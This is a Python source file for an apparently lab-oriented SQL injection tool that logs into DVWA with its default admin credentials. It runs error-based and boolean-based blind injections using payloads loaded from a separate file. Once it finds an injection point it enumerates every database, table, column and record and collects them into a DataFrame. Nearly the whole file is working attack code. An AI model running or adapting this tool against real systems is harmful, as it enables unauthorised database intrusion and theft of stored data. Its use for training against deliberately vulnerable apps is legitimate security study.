import logging
import re
import json
import string
import pandas
import requests

from typing import Generator, Union, Tuple

from pandas import DataFrame

from utilities import log
from urllib.parse import quote_plus
from urllib.parse import urlsplit, urlunsplit, SplitResult

PAYLOADS = json.load(open("payloads.json"))


def safeformat(str, **kwargs):  # a workaround for .format() to ignore missing keys
    class SafeDict(dict):
        def __missing__(self, key):
            return '{' + key + '}'

    replacements = SafeDict(**kwargs)
    return str.format_map(replacements)


class AttackException(Exception):
    pass


class Attack:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.extractors = PAYLOADS["extractors"]

    def run_payload(self, payload) -> Tuple[str, requests.Response]:
        attack_url: str = f"{self.base_url}{quote_plus(payload)}"
        response = self.session.get(attack_url)
        return attack_url, response

    def get_query_output(self, query):
        # Each attack has a different method for extracting the response out of the exploit query
        raise NotImplementedError()

    def extract(self, field, previous_fields):
        count = None
        for get_count_base_query in self.extractors[field]["get_count"]:
            try:
                get_count_query = get_count_base_query.format(**previous_fields)
                count = int(self.get_query_output(get_count_query))
                break
            except Exception:
                continue
        else:
            return []

        for base_extract_query in self.extractors[field]["extract"]:
            try:
                results = []
                for i in range(count):
                    extract_query = base_extract_query.format(index=i, **previous_fields)
                    data = self.get_query_output(extract_query)
                    if not data:
                        break

                    results.append(data)
                else:
                    return results

            except Exception:
                continue

        return []

    def exploit(self):
        all_records = []

        logging.info("Extracting all databases...")
        for database in self.extract("databases", {}):
            if database == "information_schema":
                continue

            logging.info(f"Extracting database {database}...")

            for table in self.extract("tables", {"db": database}):
                logging.info(f"Extracting table {table}...")

                for column in self.extract("columns", {"db": database, "tbl": table}):
                    logging.info(f"Extracting column {column}...")

                    for index, record in enumerate(
                            self.extract("records", {"db": database, "tbl": table, "col": column})
                    ):
                        all_records.append({
                            "database": database,
                            "table": table,
                            "column": column,
                            "index": index,
                            "value": record
                        })

        return pandas.json_normalize(all_records) if all_records else None


class ErrorBasedAttack(Attack):
    def __init__(self, session, base_url):
        super().__init__(session, base_url)
        self._description: str = "Error-based SQL injection"

        error_based = PAYLOADS["attacks"]["error-based"]
        self.error_patterns = error_based["error_patterns"]
        self.injections = error_based["injections"]

        # When we detect a possible exploit query, we'll set self.exploit_query to it
        # that other methods will use
        self.exploit_query = None

    def iterate_injections(self):
        for injection in self.injections:
            yield injection["title"], injection["detect"], injection["exploit"]

    def attack(self) -> Union[DataFrame, None]:
        for title, detect_query, exploit_query in self.iterate_injections():
            logging.info(f"Attempting error-based injection {title} ({detect_query})")
            attack_url, response = self.run_payload(detect_query)
            if not self._get_mysql_error(response=response):
                continue

            logging.critical(f"Detected error-based injection {title} with URL {attack_url}")

            self.exploit_query = exploit_query
            records = self.exploit()
            if records is None:
                continue

            logging.info("Finished Error-based attack successfully!")
            return records

        logging.info("Couldn't find Error-based attacks!")
        return None

    def get_query_output(self, query):
        full_exploit_query = self.exploit_query.format(query=query)
        attack_url, response = self.run_payload(full_exploit_query)
        return self._get_mysql_error(response)

    def _get_mysql_error(self, response) -> Union[None, str]:
        # Extracted content from response object.
        _content = response.content.decode().lower()

        for _error in self.error_patterns:
            match = re.search(_error, _content)
            if match:
                return match.group("error_response")
        return None


class BooleanBasedAttack(Attack):
    def __init__(self, session, base_url):
        super().__init__(session, base_url)
        self._description: str = "Boolean-based SQL injection"

        boolean_based = PAYLOADS["attacks"]["boolean-based"]
        self.injections = boolean_based["injections"]
        self.blind_extractors = boolean_based["blind-extractors"]

        self.detected_status_true = None
        self.detected_status_false = None

        # When we detect a possible exploit query, we'll set self.exploit_query to it
        # that other methods will use
        self.exploit_query = None

    def iterate_injections(self):
        for injection in self.injections:
            yield injection["title"], injection["detect_true"], injection["detect_false"], injection["exploit"]

    def run_boolean_query(self, boolean_query):
        if not self.exploit_query:
            raise AttackException("Did not get an exploit query for boolean based attack!")

        if not self.detected_status_false or not self.detected_status_true:
            raise AttackException("Have not detected HTTP statuses for boolean queries yet!")

        full_exploit_query = self.exploit_query.format(query=boolean_query)
        attack_url, response = self.run_payload(full_exploit_query)
        if response.status_code == self.detected_status_true:
            return True
        elif response.status_code == self.detected_status_false:
            return False

        raise AttackException(f"Unable to detect whether boolean query {boolean_query} is true or false!")

    def get_single_character_from_output(self, comparison_query, index):
        for char in string.printable:
            boolean_query = comparison_query.format(index=index + 1, char=ord(char))
            if self.run_boolean_query(boolean_query):  # Is the character correct?
                logging.info(f"Got character: {char}")
                return char

        raise AttackException(f"Could not determine character at index {index} for query {comparison_query}")

    def get_all_query_output_characters(self, comparison_query: str, output_length: int):
        output = ""

        for index in range(output_length):
            character = self.get_single_character_from_output(comparison_query, index)
            output += character

        return output

    def get_query_output_from_blind_extractors(self, blind_extractors, inner_query, expected_output_length: int):
        for blind_extractor in blind_extractors:
            try:
                comparison_query = safeformat(blind_extractor, query=inner_query)
                return self.get_all_query_output_characters(comparison_query, expected_output_length)
            except Exception as e:
                logging.warning(e, exc_info=True)
                continue

        raise AttackException(f"Could not get query output for {inner_query}")

    def get_query_output(self, query):
        try:
            output_length_of_length = int(
                self.get_query_output_from_blind_extractors(
                    blind_extractors=self.blind_extractors["length_of_length"],
                    inner_query=query,
                    expected_output_length=1
                )
            )

            output_length = int(
                self.get_query_output_from_blind_extractors(
                    blind_extractors=self.blind_extractors["length"],
                    inner_query=query,
                    expected_output_length=output_length_of_length
                )
            )

            output = self.get_query_output_from_blind_extractors(
                blind_extractors=self.blind_extractors["characters"],
                inner_query=query,
                expected_output_length=output_length
            )

            return output

        except Exception:
            return None

    def attack(self) -> Union[DataFrame, None]:
        for title, detect_true, detect_false, exploit_query in self.iterate_injections():
            logging.info(f"Attempting boolean-based injection {title}")

            attack_url_true, response_true = self.run_payload(detect_true)
            attack_url_false, response_false = self.run_payload(detect_false)

            # If same status code, we can't leak a success bit
            if response_true.status_code == response_false.status_code:
                continue

            logging.critical(f"Detected error-based injection {title}!")
            logging.info(f"Got status code {response_true.status_code} for True query URL {attack_url_true}")
            logging.info(f"Got status code {response_false.status_code} for False query URL {attack_url_false}")

            self.detected_status_true = response_true.status_code
            self.detected_status_false = response_false.status_code

            self.exploit_query = exploit_query
            records = self.exploit()
            if records is None:
                continue

            logging.info("Finished Boolean-based attack successfully!")
            return records

        logging.info("Couldn't find Boolean-based attacks!")
        return None


# Supported injection types with their corresponding classes.
INJECTION_CLASSES = {
    "error-based": ErrorBasedAttack,
    "boolean-based": BooleanBasedAttack
}


class SQLInjection:
    """
    TODO: Document this class.
    """

    def __init__(self, injection_type, url: str, login_dvwa: bool = True) -> None:
        """
        TODO: document this.
        @param injection_types:
        @param url:
        @return: None.
        """

        # Initialize HTTP session.
        self._data = None
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, " \
                                             "like Gecko) Chrome/83.0.4103.106 Safari/537.36 "

        # Initialize needed fields
        self._url = url
        self._injection_class = INJECTION_CLASSES[injection_type]

        # Support logging into DVWA server.
        if login_dvwa:
            split_url = urlsplit(url)
            login_url = urlunsplit(SplitResult(split_url.scheme, split_url.netloc, "/login.php", "", ""))

            login_payload = {"username": "admin", "password": "password", "Login": "Login"}
            r = self.session.get(login_url)
            token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
            login_payload['user_token'] = token
            self.session.post(login_url, data=login_payload)

    def attack(self) -> None:
        """
        TODO: Document this.
        @return:
        """

        # Detect vulnerabilities for provided injection class.
        attacker = self._injection_class(self.session, self._url)
        self._data = attack_result = attacker.attack()

    def __str__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        return str(self._data) if self._data is not None else "No data has been found."

    def __repr__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        return repr(self._data) if self._data is not None else "No data has been found."
